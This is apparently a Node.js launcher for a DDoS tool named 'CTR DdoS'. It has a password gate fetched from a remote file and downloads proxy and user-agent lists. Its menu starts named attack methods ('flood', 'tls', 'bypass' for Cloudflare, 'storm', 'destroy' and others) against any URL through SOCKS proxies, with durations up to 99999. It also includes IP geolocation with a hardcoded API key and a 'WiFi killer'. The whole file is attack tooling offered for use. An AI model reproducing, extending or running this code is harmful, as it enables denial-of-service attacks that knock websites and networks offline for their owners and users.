#!/usr/bin/env node

const { exec, spawn  } = require('child_process')
const readline = require('readline')
const url = require('url')
const fs = require('fs')
const axios = require('axios')
const path = require('path')
const version = '8.1.6'
let processList = [];
const cyan = '\x1b[96m'
const bold = '\x1b[1m';
const back_putih = '\x1b[48;5;255m';
const back_biru = '\x1b[48;5;57m';
const back_ungu = '\x1b[48;5;93m';
const back_ungutua = '\x1b[48;5;55m,';
const teksmerah = '\x1b[31m';
const tebal = '\x1b[1m';
const Reset = '\x1b[0m';
const biru = '\x1b[36m'
const hijau = '\x1b[38;2;144;238;144m'

const permen = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})
// [========================================] //
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
// [========================================] //
async function banner() {
console.clear()
console.log(`
  ${hijau}            ⠀⠀⠀
⠀⠀⠀⠀⢀⡠⠖⡫⠥⠐⠒⡒⢒⠞⠁⡷⢄⠀⠀⠀⠀⠀⠀
⠀⠀⢀⡴⢋⡴⣯⣠⣤⣴⠾⣿⠏⠀⠀⡶⢄⣙⢦ ⠀      ${Reset}${teksmerah}${back_putih}Welcome to CTR v1 Script${Reset}
${hijau}⢠⠎⡰⣯⢴⣿⣷⣦⣿⣶⡟⠀⠀⠀⣀⣙⡟⣄⣱⣀⣀⡀     ${Reset}${teksmerah}${back_putih}DdoS Powerfull Script${Reset}
${hijau}⢀⡇⣼⡟⢻⡄⠉⠻⡿⠟⠉⠀⠀⠀⠘⣿⣟⣉⣠⣤⣶⡏⠁    _____________________________
⢸⠀⢸⣿⣿⣿⡤⠊⠀⣀⣴⣶⣆⠀⠀⣠⣾⣿⣿⡿⠟⡇⠀   
⠸⣴⣿⣻⣿⠏⠀⠀⠈⢻⣿⣿⣿⣶⣿⣿⣿⡿⣻⠃⢀⠇⠀    Owner : http://t.me/rloo11
⠀⢻⣠⡿⠁⠀⢐⣷⣴⣶⣭⣀⠀⠙⠻⣿⣟⠔⠃⢀⠎⠀⠀    My Team : @ctr_ofc
⢀⠞⠹⣷⣶⣾⣿⣿⣿⣿⣿⣿⣿⣶⣤⣀⡙⠢⡠⠋⠀⠀⠀    Version : 1.0
⠁⠀⠀⠈⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡯⠛⠁        ${back_ungu}Vip${Reset}${back_biru}: ${hijau}Yes${Reset}
⠀${hijau}⠀⠀ ⠀⠀⠈⠉⠛⠛⠛⠛⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀    Max time : 99999${Reset}
     ${back_putih}${teksmerah}\x1b[1mT:ME/RLOO11${Reset}
${teksmerah}\x1b[1m> 𝚃𝚢𝚙𝚎 "𝚖𝚎𝚗𝚞" 𝚝𝚘 𝚜𝚝𝚊𝚛𝚝 <${Reset}${hijau}
_________________________________________________________${Reset}`)}
// [========================================] //
async function scrapeProxy() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt');
    const data = await response.text();
    fs.writeFileSync('proxy.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
async function scrapeUserAgent() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/AyamKioot/ByCtr/refs/heads/main/useragent9.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');  
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
function clearProxy() {
  if (fs.existsSync('proxy.txt')) {
    fs.unlinkSync('proxy.txt');
  }
}
// [========================================] //
function clearUserAgent() {
  if (fs.existsSync('ua.txt')) {
    fs.unlinkSync('ua.txt');
  }
}
// [========================================] //
async function bootup() {
  try {
    console.log(`|| ▓░░░░░░░░░ || 10%`);
    await exec(`npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent`)
    console.log(`|| ▓▓░░░░░░░░ || 20%`);
    const getLatestVersion = await fetch('https://raw.githubusercontent.com/Xlamper/PermenMdXlamper-Version-8.1.6-/refs/heads/main/version.txt');
    const latestVersion = await getLatestVersion.text()
    console.log(`|| ▓▓▓░░░░░░░ || 30%`);
    if (version === latestVersion.trim()) {
    console.log(`|| ▓▓▓▓▓▓░░░░ || 60%`);
    
    const secretBangetJir = await fetch('https://raw.githubusercontent.com/Rloo1197/R3X/refs/heads/main/ngeri.txt');
    const password = await secretBangetJir.text();
    await console.log(`Login Key Required`)
    permen.question(`${back_biru}${cyan}Input ${Reset}${back_ungu}${cyan}Password${Reset}: `, async (skibidi) => {
      if (skibidi === password.trim()) {
        console.log(`Successfuly Logged`)
        await scrapeProxy()
        console.log(`|| ▓▓▓▓▓▓▓░░░ || 70%`)
        await scrapeUserAgent()
        console.log(`|| ▓▓▓▓▓▓▓▓▓▓ || 100%`)
        await sleep(700)
        console.clear()
        console.log(`𝚆𝚎𝚕𝚌𝚘𝚖𝚎 𝚃𝚘 CTR DdoS ${version}`)
        await sleep(1000)
		    await banner()
        console.log(``)
        sigma()
      } else {
        console.log(`Wrong Key`)
        process.exit(-1);
      }
    }) 
  } else {
      console.log(`This Version Is Outdated. ${version} => ${latestVersion.trim()}`)
      console.log(`Waiting Auto Update...`)
      await exec(`npm uninstall -g prmnmd-tuls`)
      console.log(`Installing update`)
      await exec(`npm i -g prmnmd-tuls`)
      console.log(`Restart Tools Please`)
      process.exit()
    }
  } catch (error) {
    console.log(`Are You Online?`)
  }
}
// [========================================] //
async function killWifi() {
const wifiPath = path.join(__dirname, `/lib/cache/StarsXWiFi`);
const startKillwiFi = spawn('node', [wifiPath]);
console.log(`
WiFi Killer Has Started
Type exit To Stop
`);
permen.question(`${back_biru}𝙲𝚃𝚁${Reset}➔ ${back_ungu}${teksmerah}WiFi Killer${Reset}: \n`, async (yakin) => {
if (yakin === 'exit') {
  startKillwiFi.kill('SIGKILL')
  console.log(`WiFi Killer Has Ended`)
  sigma()
} else {
  console.log(`do you mean 'exit'?`)
  sigma()
}})
}
// [========================================] //
async function pushMonitor(target, methods, duration) {
  const startTime = Date.now();
  processList.push({ target, methods, startTime, duration })
  setTimeout(() => {
    const index = processList.findIndex((p) => p.methods === methods);
    if (index !== -1) {
      processList.splice(index, 1);
    }
  }, duration * 1000);
}
// [========================================] //
function monitorAttack() {
  console.log("\n𝙼𝚘𝚗𝚒𝚝𝚘𝚛 𝙰𝚝𝚝𝚊𝚌𝚔:\n");
  processList.forEach((process) => {
console.log(`${hijau}𝚃𝚊𝚛𝚐𝚎𝚝: ${process.target}
𝙼𝚎𝚝𝚑𝚘𝚍𝚜: ${process.methods}
𝙳𝚞𝚛𝚊𝚝𝚒𝚘𝚗𝚜: ${process.duration} 𝚂𝚎𝚌𝚘𝚗𝚍𝚜
𝚂𝚒𝚗𝚌𝚎𝚜: ${Math.floor((Date.now() - process.startTime) / 1000)} 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 𝚊𝚐𝚘${Reset}\n`);
  });
}
    
// [========================================] //
async function handleAttackCommand(args) {
  if (args.length < 3) {
    console.log(`Example: attack <url/ip> <duration> <methods>
attack https://xnxx.com 500 flood`);
    sigma();
	return
  }
const [target, duration, methods] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`
⠀⠠⠀⠄⠠⠀⠄⠠⠀⠄⠠⠀⠄⠠⠀⠄⠠⠀⠤⠠⢤⣄⣤⣹⣿⣿⣿⡿⡿⢿ ${back_putih}${teksmerah}ATTACK - DETAILS${Reset}
⠀⠡⠈⠄⡁⠌⠠⠁⠌⠠⠁⣨⡌⣛⣿⣿⣄⣥⣦⣤⡉⠈⠩⢵⣿⣿⣯⣍⣹⣩  Status :   [ ${hijau}ATTACK SENT SUCCESSFULLY${Reset} ]   
⠀⠡⠐⠠⢀⠂⠁⠂⠌⣴⣾⣿⣿⣯⣾⣿⣷⣶⡦⣝⣷⣭⠀⠄⣠⣤⣼⣯⣭⣭  Target :   [ ${cyan}${target}${Reset}⠀
 ⠡⠈⡐⠀⠌⠠⠁⢜⣿⡚⢫⣾⡛⢹⡿⣟⡟⣿⢻⣿⣯⣣⣬⣭⣽⣿⣿⣭⣭  Duration : [ ${cyan}${duration}${Reset} ]  
⠀⡁⠂⠄⡈⠐⠠⠁⢚⡽⡽⣿⠋⢳⡋⡷⢿⡟⣿⡆⣿⠋⡌⢉⣤⣶⣼⣿⣿⣿  Methods :  [ ${cyan}${methods}${Reset} ]  
⠀⠄⠡⠐⠀⡁⠂⠄⠀⠀⡚⠏⠀⠹⢋⠕⢀⠋⠘⢼⠟⠐⠁⡀⢉⡛⣩⣽⣿⣿ ${back_putih}${teksmerah}TARGET - DETAILS${Reset} 
⠀⠌⡐⢈⠐⡀⢁⠂⠄⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠄⣶⣾⣿⣿⣿⣿⠍⠉  AS :       [ ${cyan}${result.as}${Reset} ]  
⠀⠂⠄⠠⢀⠐⠠⠀⠂⠐⠄⢤⣦⣧⣦⣄⣴⣵⣤⡀⠆⠾⠾⠿⣶⣶⡆⠀⡈⠄  IP :       [ ${cyan}${result.query}${Reset} ]  
⠀⣡⣈⣐⣂⣶⣾⣿⣯⣭⠈⠘⢿⣿⣿⣩⣽⣿⡿⠁⠠⠉⡉⠉⢁⠈⡀⠐⠠⠀  ISP :      [ ${cyan}${result.isp}${Reset} ]  
 ⠤⠬⠍⠭⠩⠗⠯⠉⠁⠀⢰⣄⠙⢷⡆⠼⡋⢀⠀⠀⠀⠀⢁⠂⡐⠠⢁⠂⠁ ${back_putih}${teksmerah}CREDITS${Reset}  
⠀⡐⠠⢀⠐⡀⠂⠀⠀⠀⠀⣦⡹⡀⠀⠁⠀⠈⠂⢰⠀⠀⠀⠀⠐⠀⠂⠄⠂⠁  Owner :    [ ${cyan}@rloo11${Reset} ]
⠀⡐⢀⠂⠀⠀⠀⠀⠀⠀⢈⢿⣿⣷⡄⠀⢠⣼⣿⠇⡴⠀⠀⠀⠀⠀⠁⠐⠈⠄
⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢱⣆⡛⠭⠃⠁⠈⠻⢋⣼⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣷⣇⠆⠀⢐⢳⣿⣿⣿⠰⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣷⡀⠀⢈⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀
${hijau}> Please After Attack Type${Reset} ${cyan}'clr'${Reset} ${hijau}For Back To Home <${Reset}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
`)
} catch (error) {
  console.log(`Oops Something Went wrong`)
}
const metode = path.join(__dirname, `/lib/cache/${methods}`);
 if (methods === 'flood') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
         } else if (methods === 'starxtls') {
      pushMonitor(target, methods, duration)
       exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt `)
        sigma()
          } else if (methods === 'tls') {
       pushMonitor(target, methods, duration)
         exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt `)
     	sigma()
          } else if (methods === 'kill') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
         } else if (methods === 'bypass') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
         } else if (methods === 'thunder') {
       pushMonitor(target, methods, duration)
         exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'storm') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
           } else if (methods === 'destroy') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
         } else if (methods === 'slim') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 10 7 proxy.txt`)
          sigma()
          } else if (methods === 'quantum') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 4 proxy.txt`)
          sigma()
          } else if (methods === 'slim') {
       pushMonitor(target, methods, duration)
const destroy = path.join(__dirname, `/lib/cache/destroy.js`);
const storm = path.join(__dirname, `/lib/cache/storm.js`);
const rape = path.join(__dirname, `/lib/cache/rape.js`);
        exec(`node ${destroy} ${target} ${duration} 100 1 proxy.txt`)
        exec(`node ${storm} ${target} ${duration} 100 1 proxy.txt`)
        exec(`node ${rape} ${duration} 1 proxy.txt 70 ${target}`)
          sigma()
          } else {
    console.log(`Method ${methods} not recognized.`);
  }
};
// [========================================] //
async function trackIP(args) {
  if (args.length < 1) {
    console.log(`Example: track-ip <ip address>
track-ip 1.1.1.1`);
    sigma();
	return
  }
const [target] = args
  if (target === '0.0.0.0') {
  console.log(`Jangan Di Ulangi Manis Nanti Di Delete User Mu`)
	sigma()
  } else {
    try {
const apiKey = '8fd0a436e74f44a7a3f94edcdd71c696';
const response = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${target}`);
const res = await fetch(`https://ipwho.is/${target}`);
const additionalInfo = await res.json();
const ipInfo = await response.json();

    console.clear()
    console.log(`
⠀⠠⠀⠄⠠⠀⠄⠠⠀⠄⠠⠀⠄⠠⠀⠄⠠⠀⠤⠠⢤⣄⣤⣹⣿⣿⣿⡿⡿⢿
⠀⠡⠈⠄⡁⠌⠠⠁⠌⠠⠁⣨⡌⣛⣿⣿⣄⣥⣦⣤⡉⠈⠩⢵⣿⣿⣯⣍⣹⣩  
⠀⠡⠐⠠⢀⠂⠁⠂⠌⣴⣾⣿⣿⣯⣾⣿⣷⣶⡦⣝⣷⣭⠀⠄⣠⣤⣼⣯⣭⣭   
 ⠡⠈⡐⠀⠌⠠⠁⢜⣿⡚⢫⣾⡛⢹⡿⣟⡟⣿⢻⣿⣯⣣⣬⣭⣽⣿⣿⣭⣭  
⠀⡁⠂⠄⡈⠐⠠⠁⢚⡽⡽⣿⠋⢳⡋⡷⢿⡟⣿⡆⣿⠋⡌⢉⣤⣶⣼⣿⣿⣿  
⠀⠄⠡⠐⠀⡁⠂⠄⠀⠀⡚⠏⠀⠹⢋⠕⢀⠋⠘⢼⠟⠐⠁⡀⢉⡛⣩⣽⣿⣿  
⠀⠌⡐⢈⠐⡀⢁⠂⠄⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠄⣶⣾⣿⣿⣿⣿⠍⠉  
⠀⠂⠄⠠⢀⠐⠠⠀⠂⠐⠄⢤⣦⣧⣦⣄⣴⣵⣤⡀⠆⠾⠾⠿⣶⣶⡆⠀⡈⠄  
⠀⣡⣈⣐⣂⣶⣾⣿⣯⣭⠈⠘⢿⣿⣿⣩⣽⣿⡿⠁⠠⠉⡉⠉⢁⠈⡀⠐⠠⠀  
 ⠤⠬⠍⠭⠩⠗⠯⠉⠁⠀⢰⣄⠙⢷⡆⠼⡋⢀⠀⠀⠀⠀⢁⠂⡐⠠⢁⠂⠁  
⠀⡐⠠⢀⠐⡀⠂⠀⠀⠀⠀⣦⡹⡀⠀⠁⠀⠈⠂⢰⠀⠀⠀⠀⠐⠀⠂⠄⠂⠁  
⠀⡐⢀⠂⠀⠀⠀⠀⠀⠀⢈⢿⣿⣷⡄⠀⢠⣼⣿⠇⡴⠀⠀⠀⠀⠀⠁⠐⠈⠄
⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢱⣆⡛⠭⠃⠁⠈⠻⢋⣼⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣷⣇⠆⠀⢐⢳⣿⣿⣿⠰⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣷⡀⠀⢈⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ${hijau} Tracking IP Address Result ${Reset}
${hijau}> Type${Reset} ${cyan}'clr'${Reset} ${hijau}For Back To Home <${Reset}
${hijau}─────────────────────────────────────────────────────────────${Reset}
${hijau} > Flags :  ${Reset}      [ ${cyan}${ipInfo.country_flag}${Reset} ]
${hijau} > Country :  ${Reset}    [ ${cyan}${ipInfo.country_name}${Reset} ]
${hijau} > Capital:  ${Reset}     [ ${cyan}${ipInfo.country_capital}${Reset} ]
 ${hijau}> City :    ${Reset}     [ ${cyan}${ipInfo.city}${Reset} ]
 ${hijau}> ISP :   ${Reset}       [ ${cyan}${ipInfo.isp}${Reset} ]
${hijau} > Organization :${Reset} [ ${cyan}${ipInfo.organization}${Reset} ]
${hijau} > Lat :     ${Reset}     [ ${cyan}${ipInfo.latitude}${Reset} ]
 ${hijau}> Long :    ${Reset}     [  ${cyan}${ipInfo.longitude}${Reset} ]
  ${hijau}Google Maps: https://www.google.com/maps/place/${additionalInfo.latitude}+${additionalInfo.longitude}${Reset}
${hijau}─────────────────────────────────────────────────────────────${Reset}
`)
    sigma()
  } catch (error) {
      console.log(`Error Tracking ${target}`)
      sigma()
    }
    }
};
// [========================================] //
async function sigma() {
const getNews = await fetch(`https://raw.githubusercontent.com/permenmd/cache/main/news.txt`)
const latestNews = await getNews.text();
const creatorCredits = `
${hijau}𝐂𝐑𝐄𝐀𝐓𝐄𝐃 𝐁𝐘 R11
𝚃𝚑𝚊𝚗𝚔𝚜 𝚃𝚘:
God
Roo
Priyyxl
Irpan
Octo/Pmo
Reja
Faith
Indihome 
ChatGpt
${Reset}
`          
permen.question(`${back_biru}𝙲𝚃𝚁${Reset}➔ ${back_biru}𝙰𝚃𝚃𝙰𝙲𝙺𝙴𝚁|${Reset}${back_ungu}console${Reset} ${back_putih}${teksmerah}►${Reset} `, (input) => {
  const [command, ...args] = input.trim().split(/\s+/);

  if (command === 'menu') {
    console.log(`  ${hijau}
_____________________________________________________________
| 𝚖𝚎𝚝𝚑𝚘𝚍𝚜     | Show List of Available Method
| 𝚊𝚝𝚝𝚊𝚌𝚔      | Launch DdoS Attack 
| 𝚝𝚛𝚊𝚌𝚔-𝚒𝚙    | Track ip Adress With Info
| 𝚔𝚒𝚕𝚕-𝚠𝚒𝚏𝚒   | Kill Your Wifi
| 𝚖𝚘𝚗𝚒𝚝𝚘𝚛     | Show Monitor Attack
| 𝚌𝚛𝚎𝚍𝚒𝚝𝚜     | Show Creator
| 𝚌𝚕𝚛         | Clear Terminal 
─────────────────────────────────────────────────────────────${Reset}
`);
    sigma();
  } else if (command === 'methods') {
    console.log(`   ${hijau} 
_____________________________________________________________
|| flood      || HTTP(s) Flood DoS
|| starxtls   || Attack with TLS protocol-based DdoS
|| tls        || TLS 1.3
|| kill       || Bypass Cf DDos methods 
|| bypass     || Bypass with high power
|| thunder    || Massive Power Methods
|| storm      || The Raining Request
|| destroy    || Kill Socket
|| slim       || Low Website (repair)
|| quantum    || Bypass Protection 
────────────────────────────────────────────────────────────${Reset}
`);
    sigma();
  } else if (command === 'credits') {
    console.log(`
${creatorCredits}`);
    sigma();
  } else if (command === 'attack') {
    handleAttackCommand(args);
  } else if (command === 'kill-wifi') {
    killWifi()
  } else if (command === 'track-ip') {
    trackIP(args);
  } else if (command === 'monitor') {
    monitorAttack()
    sigma()
  } else if (command === 'clr') {
    banner()
    sigma()
    } else {
    console.log(`${command} Not Found`);
    sigma();
  }
});
}
// [========================================] //
function clearall() {
  clearProxy()
  clearUserAgent()
}
// [========================================] //
process.on('exit', clearall);
process.on('SIGINT', () => {
  clearall()
  process.exit();
});
process.on('SIGTERM', () => {
clearall()
 process.exit();
});

bootup()
